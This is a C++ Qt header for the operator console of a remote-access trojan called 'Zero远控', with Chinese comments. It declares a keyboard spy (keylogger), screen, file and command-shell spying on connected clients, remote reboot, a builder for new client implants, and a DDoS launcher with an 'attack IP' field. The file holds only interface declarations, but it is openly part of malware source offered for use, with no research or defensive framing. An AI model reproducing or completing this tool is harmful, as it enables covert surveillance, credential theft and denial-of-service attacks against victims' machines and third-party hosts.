/*
 *  Author: 752049643@qq.com
 *  Date: 2017-12-24
 *  Brief: Zero远控服务端操作界面
 *
 */

#ifndef WIDGET_H
#define WIDGET_H

#include <QWidget>
#include <QDesktopWidget>
#include <QPushButton>
#include <QTableWidget>
#include <QMenu>
#include <QMouseEvent>
#include <QDebug>
#include <QCursor>
#include "zeroserver.h"
#include <QLineEdit>
#include <QMessageBox>
#include <QInputDialog>
#include "keyboardspy.h"
#include "screenspy.h"
#include "filespy.h"
#include "cmdspy.h"
#include "ddosspy.h"
#include <QFile>
#include <QFileDialog>
#include <QMessageBox>
#include <QSoundEffect>
#include <QtNetwork>
#include <QRegExp>
#include <QTextCodec>
namespace Ui {
class Widget;
}

class Widget : public QWidget
{
    Q_OBJECT
public:
    explicit Widget(QWidget *parent = 0);
    ~Widget();

private:
    Ui::Widget *ui;
    QTableWidget *mClientTable; // 客户列表
    QMenu *mPopupMenu;          // 弹出菜单
    ZeroServer *mZeroServer;    // 服务端
    QLineEdit *mEditPort;       // 发送端口设置
    QLineEdit *mEditPort2;      //接收端口(用于内网穿透，默认相同)
    QPushButton *mBtStartServer;    // 开启服务器
    QLineEdit *mEditDomain;     // 域名设置
    QLineEdit *mEditDdos;     // 攻击IP设置

public slots:
    void screenSpyClicked();
    void keyboardClicked();
    void fileSpyClicked();
    void cmdSpyClicked();
    void cmdDdosClicked();
    void sendMessageClicked();
    void rebootClicked();
    void quitClicked();
    void aboutClicked();

    // 添加客户到列表
    void addClientToTable(int id, QString name, QString ip, int port, QString systemInfo);

    // 从列表中删除客户
    void removeClientFromTable(int id);

    // 当前选中的客户ID
    int currentClientIdFromTable();

    // 开启服务器
    void startServer();

    // 创建客户端
    void createClient();

    //查询并返回ip所在城市
    QString ipLocation(QString ip);

protected:
    // 事件过滤
    bool eventFilter(QObject *watched, QEvent *event);
};

#endif // WIDGET_H
